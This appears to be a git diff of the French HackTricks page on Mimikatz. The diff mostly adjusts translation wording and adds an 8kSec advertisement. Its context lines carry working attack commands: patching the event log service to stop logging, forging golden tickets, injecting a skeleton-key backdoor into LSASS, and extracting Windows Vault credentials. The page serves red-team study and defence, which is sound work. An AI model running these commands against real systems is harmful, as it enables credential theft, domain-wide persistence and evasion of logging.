@@ -1,21 +1,28 @@
 # Mimikatz
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Soutenir HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
 
-**Cette page est basée sur une de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consultez l'original pour plus d'infos !
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Approfondissez votre expertise en **Sécurité Mobile** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours à votre rythme et obtenez une certification :
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
+**Cette page est basée sur une de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consultez l'original pour plus d'informations !
 
 ## LM et mots de passe en clair en mémoire
 
@@ -46,22 +53,22 @@ Cela permet de vider la mémoire de `lsass.exe` dans un fichier, qui peut ensuit
 
 La falsification des journaux d'événements dans Mimikatz implique deux actions principales : effacer les journaux d'événements et patcher le service d'événements pour empêcher l'enregistrement de nouveaux événements. Voici les commandes pour effectuer ces actions :
 
-#### Effacement des journaux d'événements
+#### Effacement des Journaux d'Événements
 
 - **Commande** : Cette action vise à supprimer les journaux d'événements, rendant plus difficile le suivi des activités malveillantes.
-- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer les journaux d'événements directement via sa ligne de commande. Cependant, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou le Visualiseur d'événements Windows).
+- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer les journaux d'événements directement via sa ligne de commande. Cependant, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou le Visualiseur d'Événements Windows).
 
-#### Fonctionnalité expérimentale : Patchage du service d'événements
+#### Fonctionnalité Expérimentale : Patcher le Service d'Événements
 
 - **Commande** : `event::drop`
-- Cette commande expérimentale est conçue pour modifier le comportement du service d'enregistrement des événements, empêchant effectivement l'enregistrement de nouveaux événements.
+- Cette commande expérimentale est conçue pour modifier le comportement du Service d'Enregistrement des Événements, empêchant effectivement l'enregistrement de nouveaux événements.
 - Exemple : `mimikatz "privilege::debug" "event::drop" exit`
 
 - La commande `privilege::debug` garantit que Mimikatz fonctionne avec les privilèges nécessaires pour modifier les services système.
 - La commande `event::drop` patch alors le service d'enregistrement des événements.
 
 
-### Attaques de tickets Kerberos
+### Attaques de Tickets Kerberos
 
 ### Création de Golden Ticket
 
@@ -70,7 +77,7 @@ Un Golden Ticket permet une usurpation d'accès à l'échelle du domaine. Comman
 - Commande : `kerberos::golden`
 - Paramètres :
 - `/domain` : Le nom de domaine.
-- `/sid` : L'identifiant de sécurité (SID) du domaine.
+- `/sid` : L'Identifiant de Sécurité (SID) du domaine.
 - `/user` : Le nom d'utilisateur à usurper.
 - `/krbtgt` : Le hachage NTLM du compte de service KDC du domaine.
 - `/ptt` : Injecte directement le ticket dans la mémoire.
@@ -158,7 +165,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Divers
 
-- **MISC::Skeleton** : Injecter une porte dérobée dans LSASS sur un DC.
+- **MISC::Skeleton** : Injecter un backdoor dans LSASS sur un DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Escalade de privilèges
@@ -188,7 +195,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Services Terminal
 
-- **TS::MultiRDP** : Autoriser plusieurs sessions RDP.
+- **TS::MultiRDP** : Permettre plusieurs sessions RDP.
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions** : Lister les sessions TS/RDP.
@@ -196,13 +203,19 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Coffre
 
-- Extraire des mots de passe du Coffre Windows.
+- Extraire des mots de passe du Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Approfondissez votre expertise en **Sécurité Mobile** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours auto-dirigés et obtenez une certification :
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -210,7 +223,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
